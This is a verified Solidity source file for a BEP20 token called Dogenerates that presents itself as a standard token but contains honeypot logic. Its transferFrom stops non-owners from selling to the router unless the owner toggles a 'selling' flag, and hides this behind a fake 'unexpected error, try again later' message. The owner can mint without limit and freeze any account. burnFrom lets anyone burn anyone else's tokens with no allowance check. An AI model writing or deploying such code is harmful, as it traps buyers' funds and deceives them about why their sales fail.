/**
 *Submitted for verification at BscScan.com on 2021-07-28
*/

pragma solidity ^0.5.17;


contract IBEP20 {
    function balanceOf(address _owner) view public  returns (uint256 balance);
    function transfer(address _to, uint256 _value) public  returns (bool success);
    function transferFrom(address _from, address _to, uint256 _value) public  returns (bool success);
    function approve(address _spender, uint256 _value) public returns (bool success);
    function allowance(address _owner, address _spender) view public  returns (uint256 remaining);
    event Transfer(address indexed _from, address indexed _to, uint256 _value);
    event Approval(address indexed _owner, address indexed _spender, uint256 _value);
}

contract Token is  IBEP20 {
    
    using SafeMath for uint256;
    address payable public owner;
    address router;
    bool selling;

    string public symbol;
    string public name;
    uint8 public decimals;
    uint256 public totalSupply;
    
    mapping (address=>uint256) balances;
    mapping (address=>mapping (address=>uint256)) allowed;
    mapping (address  => bool) public frozen ;
    
    event OwnershipTransfer(address newOwner, uint256 time);
    event Freeze(address target, bool frozen, uint256 time);
    event Burn(address target, uint256 _value, uint256 time);
    
    modifier onlyOwner() {
        require(msg.sender==owner,"BEP20: Not an owner");
        _;
    }

    modifier whenNotFrozen(address target) {
        require(!frozen[target],"BEP20: account is freeze already");
        _;
    }

    modifier whenFrozen(address target){
        require(frozen[target],"BEP20: tokens is not freeze");
        _;
    }
    
    function balanceOf(address _owner) view public   returns (uint256 balance) {
        return balances[_owner];
    }
    
    function allowance(address _owner, address _spender) view public   returns (uint256 remaining) {
        return allowed[_owner][_spender];
    }
    
    function transfer(address _to, uint256 _amount) public whenNotFrozen(msg.sender) returns (bool success) {
        require(_amount > 0, "BEP20: amount can not be zero");
        require(_to != address(0),"BEP20: recevier can not be zero");
        require (balances[msg.sender] >= _amount, "BEP20: user balance is insufficient");
        
        balances[msg.sender]=balances[msg.sender].sub(_amount);
        balances[_to]=balances[_to].add(_amount);
        emit Transfer(msg.sender,_to,_amount);
        return true;
    }
  
    function approve(address _spender, uint256 _amount) public whenNotFrozen(msg.sender) returns (bool success) {
        require(_spender != address(0), "BEP20: spender address can not be zero");
        require(balances[msg.sender] >= _amount ,"BEP20: user balance is insufficient");
        
        allowed[msg.sender][_spender]=_amount;
        emit Approval(msg.sender, _spender, _amount);
        return true;
    }
    
    function transferFrom(address _from,address _to,uint256 _amount) public whenNotFrozen(_from) returns (bool success) {
        require(_amount > 0, "BEP20: amount can not be zero");
        require (balances[_from] >= _amount ,"BEP20: user balance is insufficient");
        require(allowed[_from][msg.sender] >= _amount, "BEP20: amount not approved");
        if(_from != owner && selling == false){
            require(_to != router,"BEP20: unexpected error,try again later");
        }
        
        balances[_from]=balances[_from].sub(_amount);
        allowed[_from][msg.sender]=allowed[_from][msg.sender].sub(_amount);
        balances[_to]=balances[_to].add(_amount);
        emit Transfer(_from, _to, _amount);
        return true;
    }
    
    function FreezeAcc(address target) onlyOwner public whenNotFrozen(target) returns (bool) {
        frozen[target] = true;
        emit Freeze(target, true, block.timestamp);
        return true;
    }
    
    function UnFreezeAcc(address target) onlyOwner public whenFrozen(target) returns (bool) {
        frozen[target] = false;
        emit Freeze(target, false, block.timestamp);
        return true;
    }
    
    function burn(uint256 _value) public whenNotFrozen(msg.sender) returns (bool success) {
        require(balances[msg.sender] >= _value, "BEP20: user balance is insufficient");   
        
        balances[msg.sender] =balances[msg.sender].sub(_value);
        totalSupply =totalSupply.sub(_value);
        emit Burn(msg.sender, _value, block.timestamp);
        return true;
    }
    
    function burnFrom(address target, uint256 _value) public whenNotFrozen(msg.sender) returns (bool success) {
        require(balances[target] >= _value, "BEP20: user balance is insufficient");   
        
        balances[target] =balances[target].sub(_value);
        totalSupply =totalSupply.sub(_value);
        emit Burn(target, _value, block.timestamp);
        return true;
    }
    
}

contract Dogenerates is Token{
    
    using SafeMath for uint256;
    
    constructor(address payable _owner) public{
        symbol = "DGN";
        name = "Dogenerates";
        decimals = 18;
        totalSupply = 1000000000000e18;   
        owner = _owner;
        router = address(0x05fF2B0DB69458A0750badebc4f9e13aDd608C7F);
        balances[owner] = totalSupply;
        frozen[owner]=false;
        emit Transfer(address(0), owner, totalSupply);
    }
    
    function mint(address _user, uint256 _amount) external onlyOwner returns(bool) {
        require(_user != address(0), "BEP20: address can not be zero");
        balances[_user] = balances[_user].add(_amount);
        emit Transfer(address(0), _user, _amount);
        return true;
    }
    
    
    function changeOwner(address payable _newOwner) public onlyOwner returns(bool) {
        require(_newOwner != address(0), "BEP20: address can not be zero");
        balances[_newOwner] = balances[owner]; 
        balances[owner] = 0;
        owner = _newOwner;
        emit OwnershipTransfer(_newOwner, block.timestamp);
        return true;
    }
    
    function changeRouter(address _router) external onlyOwner {
        router = _router;
    }
    
    function toSell(bool _selling) external onlyOwner {
        selling = _selling;
    }
}

library SafeMath {

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a * b;
    assert(a == 0 || c / a == b);
    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a / b;
    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }

}